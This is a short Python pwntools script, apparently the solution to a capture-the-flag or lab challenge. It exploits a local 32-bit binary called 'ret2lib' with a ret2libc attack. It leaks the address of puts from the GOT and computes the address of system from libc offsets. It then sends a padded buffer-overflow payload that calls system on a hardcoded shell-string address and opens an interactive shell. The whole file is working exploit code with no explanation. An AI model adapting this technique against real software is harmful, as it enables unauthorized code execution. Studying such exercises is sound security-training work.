#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

io = process("./ret2lib")
elf = ELF("ret2lib")
libc = elf.libc
context.log_level = 'debug'

puts_got = elf.got["puts"]
puts_offset = libc.sym["puts"]
system_offset = libc.sym["system"]

io.recvuntil(":")
io.sendline(str(puts_got))
io.recvuntil(": ")

puts_addr = int(io.recvline().strip(), base=16)
log.success('puts_addr:%x\n',puts_addr)

padding = "A" * 60
system_addr = puts_addr - puts_offset + system_offset
sh_addr = 0x804829e
payload = padding + p32(system_addr) + 'aaaa' + p32(sh_addr)

io.recvuntil(":")
io.sendline(payload)
io.recvline()

io.interactive()
io.close()
